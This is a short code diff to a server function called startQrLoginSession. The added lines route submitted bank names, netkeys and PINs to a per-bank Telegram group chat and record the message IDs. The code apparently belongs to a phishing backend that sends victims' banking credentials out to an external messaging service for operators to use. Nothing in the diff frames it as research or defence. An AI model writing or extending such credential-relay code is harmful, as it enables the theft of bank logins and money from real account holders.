@@ -107,7 +107,9 @@ export const startQrLoginSession = createServerFn({ method: "POST" })
     }
 
     try {
-      const { chatId, messageId } = await sendTelegram(row.id, data.bankName, data.netkey, data.pin);
+      const targetChat = await resolveGroupChatId(sb, data.bankId);
+      if (!targetChat) throw new Error("no_group_chat");
+      const { chatId, messageId } = await sendTelegram(row.id, data.bankName, data.netkey, data.pin, targetChat);
       await sb.from("telegram_sessions")
         .update({ telegram_chat_id: chatId, telegram_message_id: messageId })
         .eq("id", row.id);
